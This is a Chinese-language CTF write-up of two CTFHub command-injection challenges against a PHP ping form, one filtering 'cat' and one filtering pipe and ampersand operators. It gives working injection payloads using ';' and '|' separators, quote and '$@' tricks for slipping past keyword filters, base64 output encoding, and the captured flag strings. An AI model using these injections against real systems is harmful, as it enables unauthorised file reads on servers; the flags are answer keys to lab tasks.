<meta name="referrer" content="no-referrer" />

# RCE

## 过滤cat

#### 题目内容

**过滤了cat命令之后，你还有什么方法能读到 Flag?**

![image-20251016220251754](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602232119793.png)

#### 解题过程

![image-20251016171944256](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602232119352.png)



接收 `$_GET['ip']` 参数。

用 `preg_match_all("/cat/", $ip, $m)` 检测输入中是否包含字符串 `cat`。

- 如果**不包含** `cat`，则构造命令 `ping -c 4 {$ip}` 并用 `exec()` 执行。
- 如果包含 `cat`，则把匹配到的结果数组 `$m` 赋给 `$res`（并最终打印）。

在页面底部会 `print_r($res)` 显示结果，并用 `show_source(__FILE__)` 显示源码本身

输入

```
127.0.0.1 | ls
```

这里拼接命令可以使用`|`或者是`;`

一个是 **`|`（管道符）**，另一个是 **`;`（命令分隔符）**

`;`在同一行执行多个命令，**按顺序依次执行**,`cmd1; cmd2` 表示先执行 cmd1，再执行 cmd2

`|`管道符将前一个命令的**输出**作为后一个命令的**输入**

![image-20251016172045835](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602232119201.png)

使用单引号绕过 

```
flag_12726243099452.php
127.0.0.1|c''at flag_12726243099452.php
```

![image-20251016172449033](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602232119980.png)

这里发现就算绕过了cat的限制还是不会直接输出，这里是php代码被执行了

查看源码就可以看到flag

![image-20251016174055291](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602232119300.png)

这里也可以加一个编码

```
127.0.0.1; c''at flag_12726243099452.php|base64
```

![image-20251016172558704](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602232119221.png)



![image-20251016173019638](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602232119353.png)

##### flag

```
ctfhub{293caa8eabb01eca68ced424}
```



使用双引号绕过 （编码都是可选的）

```
127.0.0.1; c""at flag_12726243099452.php|base64
```

利用Shell 特殊变量绕过

```
127.0.0.1; ca$@t flag_12726243099452.php|base64
```





## 过滤运算符

#### 题目内容

**过滤了几个运算符, 要怎么绕过呢**

![image-20251016220336189](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602232119446.png)



#### 解题过程

![image-20251016173220014](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602232119501.png)

同样的，先使用`ls`命令查询出目录下的文件,这里过滤了管道符`|`，那就用命令分割符`;`

```
127.0.0.1;ls
```

![image-20251016173320599](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602232119272.png)

```
flag_16219219724986.php
```

这道题过滤了(`||&`)这些符号

```
127.0.0.1;cat flag_16219219724986.php
```

![image-20251016173732478](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602232120243.png)





查看源码

![image-20251016173757416](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602232120416.png)

##### flag

```
ctfhub{7b25853bed678af8a145f316}
```



